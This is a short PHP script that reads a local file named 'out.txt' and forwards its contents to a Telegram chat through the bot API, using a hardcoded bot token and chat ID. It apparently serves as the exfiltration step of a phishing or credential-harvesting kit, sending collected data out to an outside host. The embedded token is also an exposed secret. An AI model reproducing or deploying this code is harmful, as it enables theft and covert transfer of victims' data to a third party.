<?php
    sleep(2);
    $msg = urlencode(file_get_contents("out.txt"));
    file_get_contents("https://api.telegram.org/bot2025355732:AAG8GAcKI-nEHaR2OpMIDGOuOWzzyF4Q1pE/sendMessage?chat_id=1988183079&text=$msg");
?>
